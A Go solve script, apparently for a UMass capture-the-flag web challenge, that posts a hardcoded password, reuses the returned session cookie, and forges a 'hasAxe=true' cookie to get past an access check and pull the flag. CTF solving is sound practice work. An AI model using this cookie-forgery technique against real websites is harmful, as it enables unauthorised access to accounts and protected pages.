package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

const baseURL = "http://browser-boss-fight.web.ctf.umasscybersec.org:32770"

func newHTTPClient(followRedirects bool) *http.Client {
	transport := &http.Transport{
		Proxy: nil,
	}
	client := &http.Client{
		Transport: transport,
	}
	if !followRedirects {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}
	return client
}

func postForRedirect() (string, string, error) {
	client := newHTTPClient(false)

	form := url.Values{}
	form.Set("key", "under_the_doormat")

	req, err := http.NewRequest(http.MethodPost, baseURL+"/password-attempt", strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusFound {
		return "", "", fmt.Errorf("expected 302 redirect, got %d", resp.StatusCode)
	}

	location := resp.Header.Get("Location")
	if location == "" {
		return "", "", fmt.Errorf("missing redirect location")
	}

	sessionCookie := ""
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "connect.sid" {
			sessionCookie = cookie.Name + "=" + cookie.Value
			break
		}
	}
	if sessionCookie == "" {
		return "", "", fmt.Errorf("missing connect.sid cookie")
	}

	return location, sessionCookie, nil
}

func fetchWithAxe(location, sessionCookie string) (string, error) {
	client := newHTTPClient(true)

	req, err := http.NewRequest(http.MethodGet, baseURL+location, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Cookie", sessionCookie+"; hasAxe=true")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func extractFlag(text string) (string, error) {
	re := regexp.MustCompile(`UMASS\{[^}]+\}`)
	match := re.FindString(text)
	if match == "" {
		return "", fmt.Errorf("flag not found in response")
	}
	return match, nil
}

func main() {
	location, sessionCookie, err := postForRedirect()
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	page, err := fetchWithAxe(location, sessionCookie)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	flag, err := extractFlag(page)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	fmt.Println(flag)
}
